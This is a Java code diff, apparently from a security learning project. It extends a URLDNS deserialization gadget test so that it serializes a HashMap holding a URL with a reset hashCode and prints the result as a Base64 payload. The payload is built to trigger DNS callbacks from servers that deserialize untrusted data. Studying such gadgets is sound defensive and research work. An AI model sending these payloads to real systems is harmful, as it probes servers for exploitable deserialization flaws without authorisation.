@@ -4,6 +4,8 @@ package Clown_URLDNS;
 import java.io.*;
 import java.lang.reflect.Field;
 import java.net.URL;
+import java.util.Arrays;
+import java.util.Base64;
 import java.util.HashMap;
 
 
@@ -14,6 +16,22 @@ public class URLDNSTest {
         objectOutputStream.writeObject(object);
         System.out.println("serialization方法成功执行");
     }
+
+    public static void serializeAndPrintBase64(Object object) throws Exception {
+        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
+        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
+        objectOutputStream.writeObject(object);
+        objectOutputStream.close();
+
+        byte[] serializedBytes = byteArrayOutputStream.toByteArray();
+
+        // 使用Base64编码字节数组并打印到控制台
+        String base64Encoded = Base64.getEncoder().encodeToString(serializedBytes);
+//        String payload = Arrays.toString(Base64.getDecoder().decode(base64Encoded));
+//        System.out.println(payload);
+        System.out.println("Serialized and Base64 encoded object: " + base64Encoded);
+    }
+
 
     public static void unserialization() throws Exception{
         FileInputStream fileInputStream = new FileInputStream("URLDNS.txt");
@@ -36,7 +54,8 @@ public class URLDNSTest {
 
         hashMap.put(url,1);
         hashcodefield.set(url,-1);//设置hashCode值为-1
-        serialization(hashMap);
+//        serialization(hashMap);
+        serializeAndPrintBase64(hashMap);
 //        unserialization();
     }
 }
